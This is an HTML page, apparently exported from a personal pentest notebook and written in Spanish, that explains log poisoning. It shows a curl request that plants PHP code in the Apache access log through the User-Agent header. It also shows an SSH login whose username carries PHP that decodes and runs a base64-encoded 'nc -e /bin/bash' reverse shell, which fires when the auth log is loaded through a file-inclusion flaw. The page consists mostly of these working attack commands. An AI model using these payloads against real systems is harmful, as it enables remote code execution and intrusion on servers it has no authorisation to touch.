@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Log Poisoning</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Log Poisoning</h1><br/><strong><span style="text-decoration:underline;">APACHE LOG</span></strong><br /><br />El log poisoning se produce cuando usuarios no deseados pueden leer logs del sistema, ahora modificaremos la cabecera de la peticion para instertar codigo malicioso<br /><br /><div class="codebox"><div class="codebox">┌──(kali@kali)-[~]<br />└─$&nbsp;curl&nbsp;&quot;http://localhost/page.php?filename=/var/log/apache2/access.log&quot;&nbsp;-H&nbsp;&quot;User-Agent:&nbsp;&lt;?php&nbsp;system(&#39;whoami&#39;);&nbsp;?&gt;&quot;</div></div><br /><br />Este comando nos diria por ejemplo que usuario somos<br /><br /><strong><span style="text-decoration:underline;">AUTH LOG</span></strong><br /><br />Ahora usaremos el log de autentificacion para inyectar codigo malicioso, para ello insertaremos el codigo en un login del sistema como puede ser ssh<br /><br /><div class="codebox"><div class="codebox">┌──(kali@kali)-[~]<br />└─$&nbsp;echo&nbsp;&#39;nc&nbsp;-e&nbsp;/bin/bash&nbsp;127.0.0.1&nbsp;4646&#39;&nbsp;|&nbsp;base64<br />bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NjQ2Cg==</div></div><br /><br /><br /><div class="codebox"><div class="codebox">┌──(kali@kali)-[~]<br />└─$&nbsp;ssh&nbsp;&#39;&lt;?php&nbsp;system(&quot;echo&nbsp;bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NjQ2Cg==&nbsp;|&nbsp;base64&nbsp;-d&nbsp;|&nbsp;bash&quot;);&nbsp;?&#39;@localhost</div></div><br /><br />En este caso nos dara error de autentificacion en el log, despues nos iriamos al log a traves del navegador y una vez recarguemos la pagina se nos creara una reverse shell<br /><br /><br /><br /><br /><a href="Explotacion.html">Volver al indice</a><br /></div>
+</body>
+</html>
